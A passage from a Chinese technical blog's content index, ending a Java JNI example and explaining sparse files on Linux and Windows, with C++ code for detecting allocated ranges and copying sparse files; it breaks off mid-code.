class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tFibonacci.init();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(Fibonacci.get(i));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>输出正常：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">5</span><br><span class=\"line\">8</span><br><span class=\"line\">13</span><br><span class=\"line\">21</span><br><span class=\"line\">34</span><br><span class=\"line\">55</span><br></pre></td></tr></table></figure></p>\n<p>更多详细JNI样例见：<a href=\"https://blog.csdn.net/qq_30114557/article/details/83325455\">Java JNI进阶编程</a></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://wenku.baidu.com/view/995c718b84868762caaed52c.html\">JNI技术小结</a></li>\n<li><a href=\"https://blog.csdn.net/qq_30114557/article/details/83325455\">Java JNI进阶编程</a></li>\n<li><a href=\"https://www.jb51.net/article/131136.htm\">JNI库打包jar</a></li>\n</ul>\n","tags":["Java"]},{"title":"稀疏文件简介","url":"/2023/02/19/%E7%A8%80%E7%96%8F%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B/","content":"<p>Linux上可以快速创建一个超过卷自身大小的文件。例如<code>/dev/nvme0n1p2</code>对应的大小只有234GB：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~/workspace </span><br><span class=\"line\">╰─$ df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">dev             7.8G     0  7.8G   0% /dev</span><br><span class=\"line\">run             7.8G  1.6M  7.8G   1% /run</span><br><span class=\"line\">/dev/nvme0n1p2  234G  196G   26G  89% /</span><br><span class=\"line\">tmpfs           7.8G  172M  7.6G   3% /dev/shm</span><br><span class=\"line\">tmpfs           7.8G   21M  7.8G   1% /tmp</span><br><span class=\"line\">/dev/nvme0n1p1  500M  114M  386M  23% /boot</span><br><span class=\"line\">tmpfs           1.6G   76K  1.6G   1% /run/user/1000</span><br></pre></td></tr></table></figure><br>用<code>dd if=/dev/zero bs=1M count=1 of=sparsefile seek=1000000</code>以1MB为单位，从1000000的位置，即offset = 1M * 1000000处写入一个1M的数据块：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~/workspace </span><br><span class=\"line\">╰─$ dd <span class=\"keyword\">if</span>=/dev/zero bs=1M count=1 of=sparsefile seek=1000000          </span><br><span class=\"line\">1+0 records <span class=\"keyword\">in</span></span><br><span class=\"line\">1+0 records out</span><br><span class=\"line\">1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.00405439 s, 259 MB/s</span><br></pre></td></tr></table></figure></p>\n<p>用<code>ll -h</code>可以看到文件空间占用达到了977GB：</p>\n<span id=\"more\"></span>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~/workspace </span><br><span class=\"line\">╰─$ ll -h sparsefile </span><br><span class=\"line\">-rw-r--r-- 1 xuranus xuranus 977G Feb 19 10:50 sparsefile</span><br></pre></td></tr></table></figure>\n<p>这里的977GB是<strong>逻辑占用</strong>、即<strong>文件系统API会返回的文件大小</strong>，也是用户和应用程序感知到的文件大小。如果使用<code>du -hs</code>查看文件大小，可以看到依然占用1MB：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">╭─xuranus@Thanos ~/workspace</span><br><span class=\"line\">╰─$ du -hs sparsefile          </span><br><span class=\"line\">1.0M    sparsefile</span><br></pre></td></tr></table></figure><br>这是因为<code>du</code>是按照占用block大小计算的，统计的是物理占用。</p>\n<h2 id=\"稀疏文件简介\"><a href=\"#稀疏文件简介\" class=\"headerlink\" title=\"稀疏文件简介\"></a>稀疏文件简介</h2><p><strong>这种物理占用和逻辑占用不一致的特殊文件就是稀疏文件（Sparse File）,又称“空洞文件”。稀疏文件需要特定文件系统的支持，例如NTFS、Ext4等就支持稀疏文件。</strong></p>\n<p>稀疏文件由文件系统记录实际分配的区间，应用程序调用常规的文件系统API读写文件时候不会感知到空洞的部分的存在。</p>\n<p><strong>没有分配的区间默认写0。实际分配的区间信息记录在文件的元数据中</strong>。一个稀疏文件会存在一个或多个没有分配实际空间的区间，这些默认以0填充的空间就是空洞（Hole）。</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p><strong>稀疏文件可以用于快速创建一个大文件</strong>。例如Linux的Samba的服务端在接受新文件的时候，会先创建对应大小的纯空洞文件。由于创建稀疏文件只需要修改文件对于的元数据块，这种操作几乎是立刻完成的。然后在后续的网络传输过程中逐渐分配实际空间并写入数据，这种方法会导致传输过程中文件逻辑占始终保持不变。</p>\n<blockquote>\n<p>曾经被这种机制坑过：详见这篇<a href=\"2021/03/29/Samba拷贝文件的pre-allowcate机制/\">《Samba拷贝文件的pre-allowcate机制》</a></p>\n</blockquote>\n<p><strong>在拷贝稀疏文件的过程中，如果目标文件系统也支持稀疏文件，就可以只拷贝实际分配的区间，这样将大大提高拷贝的效率。</strong></p>\n<p>此外很多指令对稀疏文件的复制都有优化，例如<code>cp</code>命令有一个针对稀疏文件拷贝优化的参数<code>--spare=WHEN</code>,<code>WHEN</code>的值为<code>auto</code>、<code>always</code>、<code>never</code>，默认为<code>auto</code>，如果设置为<code>never</code>则会自动填数据。</p>\n<p>知道了稀疏文件的概念和用途，接下来就是要了解如何读写稀疏文件。由于稀疏文件的IO对应用程序不感知，这里所谓的读也就是获取实际的分配区间，写就是创建稀疏文件。接下来就Linux和Windows两个平台分别讨论。</p>\n<h2 id=\"Linux读写稀疏文件\"><a href=\"#Linux读写稀疏文件\" class=\"headerlink\" title=\"Linux读写稀疏文件\"></a>Linux读写稀疏文件</h2><p>Linux没有直接标记稀疏文件属性的字段，可以用<code>if (st.st_blocks * st.st_blksize &lt; st.st_size) &#123; sparse-file &#125; else &#123; PROBABLY NOT SPARSE &#125;</code>粗略过滤稀疏文件。要明确探寻空洞是否存在得用<code>lseek(fd, cur, SEEK_HOLE)</code>。</p>\n<p><code>lseek(fd, cur, SEEK_HOLE)</code>返回以cur开始，下一个空洞的位置（查询失败返回-1）。反之同理，<code>lseek(fd, cur, SEEK_DATA)</code>返回下一个实际分配的位置。</p>\n<blockquote>\n<p>先来复习一下<code>lseek</code>的用法：<code>lseek</code>用于移动文件读写指针，并返回指针指向的便宜量，<code>open</code>后的文件读写指针默认指向为起始处0。<code>lseek(fd, off, SEEK_SET)</code>将文件指针指向<code>off</code>处，<code>lseek(fd, off, SEEK_CUR)</code>将指针指向当前位置+<code>off</code>个偏移位置处，<code>lseek(fd, 0, SEEK_END)</code>将指针指向文件末尾（一般用于获取文件的逻辑大小）。如果<code>lseek</code>使得当前指针指向超过了文件大小，继续写则会自动创造空洞（前提是该文件系统和Linux内核版本支持稀疏文件）。</p>\n</blockquote>\n<h3 id=\"查询稀疏文件分配区间\"><a href=\"#查询稀疏文件分配区间\" class=\"headerlink\" title=\"查询稀疏文件分配区间\"></a>查询稀疏文件分配区间</h3><p>基于上述原理，以下代码用<code>lseek</code>获取所有实际分配的区间:<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __linux__</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> SparseRangeResult = std::optional&lt;std::vector&lt;std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&gt;&gt;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __linux__</span></span><br><span class=\"line\"><span class=\"comment\">/* Represent the range using [&lt;offset, length&gt;] */</span></span><br><span class=\"line\"><span class=\"function\">SparseRangeResult <span class=\"title\">QuerySparsePosixAllocateRanges</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; path)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> SEEK_HOLE</span></span><br><span class=\"line\">    std::vector&lt;std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&gt; ranges;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> fd = ::<span class=\"built_in\">open</span>(path.<span class=\"built_in\">c_str</span>() , O_RDONLY | O_NONBLOCK);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">off_t</span> end = ::<span class=\"built_in\">lseek</span>(fd, <span class=\"number\">0</span>, SEEK_END); <span class=\"comment\">/* offset at the end of file */</span></span><br><span class=\"line\">    <span class=\"keyword\">off_t</span> hole = ::<span class=\"built_in\">lseek</span>(fd, <span class=\"number\">0</span>, SEEK_HOLE); <span class=\"comment\">/* offset of first hole if exist */</span></span><br><span class=\"line\">    <span class=\"keyword\">off_t</span> cur = <span class=\"number\">0</span>, offset = <span class=\"number\">0</span> , len = <span class=\"number\">0</span>; <span class=\"comment\">/* search from beginning */</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (cur &lt; end) &#123;</span><br><span class=\"line\">        cur = ::<span class=\"built_in\">lseek</span>(fd, cur, SEEK_DATA); <span class=\"comment\">/* first allocated range beginning */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur == <span class=\"number\">-1</span> &amp;&amp; errno == ENXIO) &#123;</span><br><span class=\"line\">            cur = end;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> std::nullopt; <span class=\"comment\">/* query failed */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        offset = cur; <span class=\"comment\">/* offset point to the left border of data range */</span></span><br><span class=\"line\">        cur = ::<span class=\"built_in\">lseek</span>(fd, cur, SEEK_HOLE); <span class=\"comment\">/* cur point to left border next hole */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> std::nullopt; <span class=\"comment\">/* query failed */</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        len = cur - offset;</span><br><span class=\"line\">        ranges.<span class=\"built_in\">emplace_back</span>(offset, len);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::<span class=\"built_in\">make_optional</span>(ranges);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    <span class=\"comment\">/* kernel not support sparse file */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"复制稀疏文件\"><a href=\"#复制稀疏文件\" class=\"headerlink\" title=\"复制稀疏文件\"></a>复制稀疏文件</h3><p>拿到了实际分配区间后，执行稀疏文件拷贝的时候就可以按照区间描述的信息<strong>只拷贝实际分配的空间</strong>。</p>\n<p>需要注意的是：<code>lseek</code>只移动指针，不写入。如果要创造空洞区域需要配合<code>write</code>一起进行。如果空洞出现了源文件末尾（例如<code>dd if=/dev/zero bs=1M count=0 of=sparsefile seek=1000000</code>可以构造出逻辑占用900多G但是实际大小0B的全是空洞的文件），此时<code>lseek</code>只能将指针移动到末尾，但<code>write</code>不能写入任何数据，于是不能在末尾按照预期制造空洞。</p>\n<p>这时候就需要用<code>ftruncate</code>来拓展尾部空洞。<code>ftruncate(fd, offset)</code>会扩展或者截取文件长度。如果<code>offset</code>比文件长度长，则会在文件末尾补全空洞；如果比文件长度短，则会将文件截断至目标长度。</p>\n<p>更好的选择是直接用<code>ftruncate</code>创建对应逻辑大小实际占用为0的完全空洞文件，再依次写入实际分配的区间数据，这也是拷贝稀疏文件常选用的方法。</p>\n<p>基于上述方法，Linux下拷贝稀疏文件的代码如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __linux__</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CopySparseFilePosix</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; srcPath, <span class=\"keyword\">const</span> std::string&amp; dstPath,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"keyword\">const</span> std::vector&lt;std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&gt;&amp; ranges)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> DEFAULT_BUFF_SIZE = <span class=\"number\">1024</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[DEFAULT_BUFF_SIZE] = <span class=\"string\">&quot;\\0&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> inFd = ::<span class=\"built_in\">open</span>(srcPath.<span class=\"built_in\">c_str</span>(), O_RDONLY);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inFd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> outFd = ::<span class=\"built_in\">open</span>(dstPath.<span class=\"built_in\">c_str</span>() ,O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (outFd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">close</span>(inFd);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* truncate target file at first */</span></span><br><span class=\"line\">    <span class=\"keyword\">off_t</span> srcSize = ::<span class=\"built_in\">lseek</span>(inFd, <span class=\"number\">0</span>, SEEK_END);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">ftruncate</span>(outFd, srcSize) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* truncate failed */</span></span><br><span class=\"line\">        ::<span class=\"built_in\">close</span>(inFd);</span><br><span class=\"line\">        ::<span class=\"built_in\">close</span>(outFd);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* write allocated range */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&amp; range: ranges) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> offset = range.first;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> len = range.second;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> nbytes = <span class=\"number\">0</span>; <span class=\"comment\">/* n bytes to copy in this batch */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">lseek</span>(inFd, offset, SEEK_SET); <span class=\"comment\">/* set fd to the beginning of the range */</span></span><br><span class=\"line\">            ::<span class=\"built_in\">lseek</span>(outFd, offset, SEEK_SET);</span><br><span class=\"line\">            nbytes = <span class=\"built_in\">min</span>(len, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff)); <span class=\"comment\">/* if the range can be copied in this batch */</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> n = ::<span class=\"built_in\">read</span>(inFd, buff, nbytes);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (n != nbytes) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/* read failed */</span></span><br><span class=\"line\">                ::<span class=\"built_in\">close</span>(inFd);</span><br><span class=\"line\">                ::<span class=\"built_in\">close</span>(outFd);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            n = ::<span class=\"built_in\">write</span>(outFd, buff, nbytes);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (n != nbytes) &#123;</span><br><span class=\"line\">                <span class=\"comment\">/* write failed */</span></span><br><span class=\"line\">                ::<span class=\"built_in\">close</span>(inFd);</span><br><span class=\"line\">                ::<span class=\"built_in\">close</span>(outFd);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            offset = offset + nbytes; <span class=\"comment\">/* reset offset and length */</span></span><br><span class=\"line\">            len = len - nbytes;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> (len != <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/* copy success */</span></span><br><span class=\"line\">    ::<span class=\"built_in\">close</span>(inFd);</span><br><span class=\"line\">    ::<span class=\"built_in\">close</span>(outFd);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Windows读写稀疏文件\"><a href=\"#Windows读写稀疏文件\" class=\"headerlink\" title=\"Windows读写稀疏文件\"></a>Windows读写稀疏文件</h2><p>Windows文件系统有标记稀疏文件属性的字段，只需要判断文件属性<code>dwFileAttributes</code>是否有<code>FILE_ATTRIBUTE_SPARSE_FILE</code>位即可。具有<code>FILE_ATTRIBUTE_SPARSE_FILE</code>属性的文件只是支持了稀疏文件，但不一定意味着这个文件就含有空洞。Windows官方提供了检测稀疏文件的样例程序，使用<code>DeviceIoControl</code>指定<code>FSCTL_QUERY_ALLOCATED_RANGES</code>就可以获取稀疏文件的实际分配区间。</p>\n<p>Windows稀疏文件详见这篇：<a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/sparse-file-operations\">Sparse File Operations</a></p>\n<h3 id=\"创建稀疏文件\"><a href=\"#创建稀疏文件\" class=\"headerlink\" title=\"创建稀疏文件\"></a>创建稀疏文件</h3><p>Windows稀疏文件写入和Linux类似，都是基于“移动文件指针超出文件大小，制造空洞区域”来创建稀疏文件。区别是：<strong>Windows下写入稀疏文件前需要显式声明该文件是一个稀疏文件</strong>，而Linux下会根据文件系统是否支持稀疏文件自动选择创建空洞还是分配实际空间。</p>\n<p>Windows下声明文件是稀疏文件就是设置文件<code>FILE_ATTRIBUTE_SPARSE_FILE</code>属性的过程。需要用<code>DeviceIoControl</code>和<code>FSCTL_SET_SPARSE</code>设置文件稀疏属性。<strong>如果设置成功，在文件当前指针偏移量超出文件大小时写数据就会产生空洞，反之则是分配实际的空间并写0。</strong></p>\n<p>类似于Linux的<code>lseek()</code>，Windows下使用<code>SetFilePointerEx()</code>设置文件当前读写指针。<code>SetFilePointerEx()</code>是<code>SetFilePointer()</code>的扩展版本，可以设置4GB以上的偏移量。<code>SetEndOfFile()</code>可以将当前指针指向的位置设置为文件末尾，结合<code>SetFilePointerEx()</code>可以实现Linux下<code>ftruncate()</code>的效果。</p>\n<p>依据这些API可以先创建出一个稀疏文件<code>C:\\Test\\sparsefile</code>，该稀疏文件逻辑占用100MB，在10MB ~ 30MB, 50MB ~ 80MB上有实际的空间分配，创建代码如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">wmain</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, WCHAR** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::wstring wPath = <span class=\"string\">LR&quot;(C:\\Test\\sparsefile)&quot;</span>;</span><br><span class=\"line\">    DWORD nWritten = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD dwTemp = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// open file for write</span></span><br><span class=\"line\">    HANDLE hOutFile = ::<span class=\"built_in\">CreateFileW</span>(wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_WRITE,</span><br><span class=\"line\">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        CREATE_NEW,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hOutFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// set sparse flag</span></span><br><span class=\"line\">    ::<span class=\"built_in\">DeviceIoControl</span>(hOutFile,</span><br><span class=\"line\">        FSCTL_SET_SPARSE,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        &amp;dwTemp,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"comment\">// write data</span></span><br><span class=\"line\">    LARGE_INTEGER sizeEx;</span><br><span class=\"line\">    sizeEx.QuadPart = <span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">100</span>; <span class=\"comment\">// 100MB</span></span><br><span class=\"line\">    <span class=\"comment\">// truncate a file size 100MB</span></span><br><span class=\"line\">    ::<span class=\"built_in\">SetFilePointerEx</span>(hOutFile, sizeEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN);</span><br><span class=\"line\">    ::<span class=\"built_in\">SetEndOfFile</span>(hOutFile);</span><br><span class=\"line\">    <span class=\"comment\">// write 20MB at offset 10MB</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> buff[<span class=\"number\">1024</span>] = &#123;<span class=\"string\">&#x27;a&#x27;</span>&#125;;</span><br><span class=\"line\">    LARGE_INTEGER offsetEx;</span><br><span class=\"line\">    offsetEx.QuadPart = <span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">20</span>;</span><br><span class=\"line\">    ::<span class=\"built_in\">SetFilePointerEx</span>(hOutFile, offsetEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span> * <span class=\"number\">1024</span>; i++) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">WriteFile</span>(hOutFile, buff, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff), &amp;nWritten, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// write 30MB at offset 50MB</span></span><br><span class=\"line\">    offsetEx.QuadPart = <span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>;</span><br><span class=\"line\">    ::<span class=\"built_in\">SetFilePointerEx</span>(hOutFile, offsetEx, <span class=\"literal\">nullptr</span>, FILE_BEGIN);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">30</span> * <span class=\"number\">1024</span>; i++) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">WriteFile</span>(hOutFile, buff, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(buff), &amp;nWritten, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// alloc range: 10MB ~ 30MB, 50MB ~ 80MB</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"查询稀疏文件分配区间-1\"><a href=\"#查询稀疏文件分配区间-1\" class=\"headerlink\" title=\"查询稀疏文件分配区间\"></a>查询稀疏文件分配区间</h3><p>Windows查询稀疏文件分配区间和Linux不太一样，Windows不提供<code>SEEK_HOLE</code>，而是使用指定的Windows API。<code>DeviceIoControl()</code>结合<code>FSCTL_QUERY_ALLOCATED_RANGES</code>可以查询指定文件的实际分配区间，代码如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">SparseRangeResult <span class=\"title\">QuerySparseWin32AllocateRangesW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::vector&lt;std::pair&lt;<span class=\"keyword\">uint64_t</span>, <span class=\"keyword\">uint64_t</span>&gt;&gt; ranges;</span><br><span class=\"line\">    <span class=\"comment\">/* Open the file for read */</span></span><br><span class=\"line\">    HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">                        wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">                        GENERIC_READ,</span><br><span class=\"line\">                        <span class=\"number\">0</span>,</span><br><span class=\"line\">                        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">                        OPEN_EXISTING,</span><br><span class=\"line\">                        FILE_ATTRIBUTE_NORMAL,</span><br><span class=\"line\">                        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    LARGE_INTEGER liFileSize;</span><br><span class=\"line\">    <span class=\"built_in\">GetFileSizeEx</span>(hFile, &amp;liFileSize);</span><br><span class=\"line\">    <span class=\"comment\">/* Range to be examined (the whole file) */</span></span><br><span class=\"line\">    FILE_ALLOCATED_RANGE_BUFFER queryRange;</span><br><span class=\"line\">    queryRange.FileOffset.QuadPart = <span class=\"number\">0</span>;</span><br><span class=\"line\">    queryRange.Length = liFileSize;</span><br><span class=\"line\">    <span class=\"comment\">/* Allocated areas info */</span></span><br><span class=\"line\">    FILE_ALLOCATED_RANGE_BUFFER allocRanges[<span class=\"number\">1024</span>];</span><br><span class=\"line\">    DWORD nbytes;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> fFinished;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        fFinished = <span class=\"built_in\">DeviceIoControl</span>(</span><br><span class=\"line\">                        hFile,</span><br><span class=\"line\">                        FSCTL_QUERY_ALLOCATED_RANGES,</span><br><span class=\"line\">                        &amp;queryRange,</span><br><span class=\"line\">                        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(queryRange),</span><br><span class=\"line\">                        allocRanges,</span><br><span class=\"line\">                        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(allocRanges),</span><br><span class=\"line\">                        &amp;nbytes,</span><br><span class=\"line\">                        <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!fFinished) &#123;</span><br><span class=\"line\">            DWORD dwError = <span class=\"built_in\">GetLastError</span>();</span><br><span class=\"line\">            <span class=\"comment\">/* ERROR_MORE_DATA is the only error that is normal */</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (dwError != ERROR_MORE_DATA) &#123;</span><br><span class=\"line\">                ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">/* Calculate the number of records returned */</span></span><br><span class=\"line\">        DWORD dwAllocRangeCount = nbytes / <span class=\"built_in\"><span 